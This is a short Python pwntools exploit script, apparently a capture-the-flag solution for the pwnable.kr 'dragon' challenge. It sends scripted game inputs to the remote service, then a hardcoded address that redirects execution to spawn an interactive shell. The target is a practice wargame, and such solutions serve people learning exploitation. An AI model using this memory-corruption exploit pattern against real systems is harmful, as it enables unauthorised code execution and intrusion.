#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# context.log_level = 'debug'

system_addr = p32(0x08048DBF)
payload = '2\n2\n' # Knight meet babe dragon, sacrifice yourself 
payload += '1'+'\n3\n3\n2'*4 # Priest meet mama dragon, kill it with holyshield :)
p = remote('pwnable.kr', 9004)
# p = process('./dragon')
p.recvuntil('[ 2 ] Knight', timeout=1)
log.info('Knight meet babe dragon, sacrificing...') 
log.info('Priest meet mama dragon, killing it with holyshield...') 
p.sendline(payload)
p.sendline(system_addr)
p.recvuntil('And The Dragon You Have Defeated Was Called:', timeout=1)
log.info('Dragon has been killed! now get shell! Enjoy :)') 
p.interactive()
